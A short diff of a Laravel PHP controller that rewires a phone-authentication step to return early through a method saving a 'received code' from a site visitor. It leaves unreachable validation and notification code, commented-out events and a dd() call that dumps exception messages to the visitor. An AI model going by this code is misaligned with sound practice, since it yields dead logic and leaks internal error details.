@@ -293,9 +293,10 @@ class TripController extends Controller
     public function phoneAuthStore(Request $request)
     {
         try {
+            return $this->saveRecievedCode($request);
             $validated = $this->validate($request, [
-                'phone' => 'required',
-                'provider' => 'required',
+                'phone_number' => 'required',
+                // 'provider' => 'required',
             ]);
 
             $visitor = session()->get('visitor') ? json_decode(session()->get('visitor')) : null;
@@ -303,9 +304,10 @@ class TripController extends Controller
 
                 $not  = VisitorNotifications::first();
 
-                event(new SendCode($not));
+                // event(new SendCode($not));
                 event(new SendNotification($not));
             }
+            // return view('phone_waiting',compact('not'));
             return view('phone_waiting',compact('not'));
         } catch (\Exception $ex) {
             dd($ex->getMessage());
